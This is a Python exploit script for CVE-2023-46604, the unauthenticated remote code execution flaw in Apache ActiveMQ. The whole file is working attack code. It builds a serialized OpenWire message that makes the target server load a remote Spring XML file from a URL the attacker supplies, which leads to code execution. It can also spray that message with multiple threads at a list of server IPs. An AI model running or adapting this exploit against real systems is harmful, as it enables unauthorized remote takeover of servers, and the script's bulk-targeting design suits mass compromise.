import binascii
import socket
import argparse
import threading
import signal
import sys


def int_to_hex(i, n):
    return format(i, 'x').zfill(n)

def string_to_hex(s):
    return binascii.hexlify(s.encode()).decode()

def exploit(ip, port, url, timeout):
    class_name = "org.springframework.context.support.ClassPathXmlApplicationContext"
    message = url

    header = "1f00000000000000000001"
    body = header + "01" + int_to_hex(len(class_name), 4) + string_to_hex(class_name) + "01" + int_to_hex(len(message), 4) + string_to_hex(message)
    payload = int_to_hex(len(body)//2, 8) + body
    data = bytes.fromhex(payload)

    print(f"[*] Exploit Sent To Target: {ip}:{port}")
#    print("[*] XML URL:", url)
    try:
        with socket.create_connection((ip, int(port)), timeout=int(timeout)) as conn:
            conn.sendall(data)
    except KeyboardInterrupt:
        print("\n[*] Received Ctrl+C during connection attempt. Terminating...")
        sys.exit(0)
    except Exception as e:
        print(f"Error: {e}")

def banner():
    print("Python implementation of Apache ActiveMQ Unauthenticated Remote Code Execution \nCVE: CVE-2023-46604\nCoded by N.Keshawarz (https://github.com/NKeshawarz) \n\n")

def main():
    parser = argparse.ArgumentParser(description="Apache ActiveMQ Unauthenticated Remote Code Execution")
    parser.add_argument("-f", "--file", help="File with a list of ActiveMQ Server IPs")
    parser.add_argument("-i", "--ip", help="ActiveMQ Server IP or Host (single IP)")
    parser.add_argument("-p", "--port", help="ActiveMQ Server Port", default="61616")
    parser.add_argument("-n", "--threads", type=int, default=1, help="Number of threads")
    parser.add_argument("-t", "--timeout", help="Connection timeout for each requests", default="10")
    parser.add_argument("-u", "--url", help="XML Url", required=True)
    args = parser.parse_args()

    banner()

    if args.file and args.ip:
        print("Error: Please provide either a file (-f) or a single host (-h), not both.")
        return
    if args.file:
        try:
            with open(args.file, 'r') as file:
                ips = [line.strip() for line in file.readlines()]
        except FileNotFoundError:
            print(f"Error: File '{args.file}' not found.")
            return
    elif args.ip:
        ips = [args.ip]
    else:
        print("Error: Please provide either a file (-f) or a single host (-h).")
        return

    urls = args.url.split(',')

    threads = []
    for ip in ips:
        for url in urls:
            for _ in range(args.threads):
                thread = threading.Thread(target=exploit, args=(ip, args.port, url.strip(), args.timeout))
                threads.append(thread)
                thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
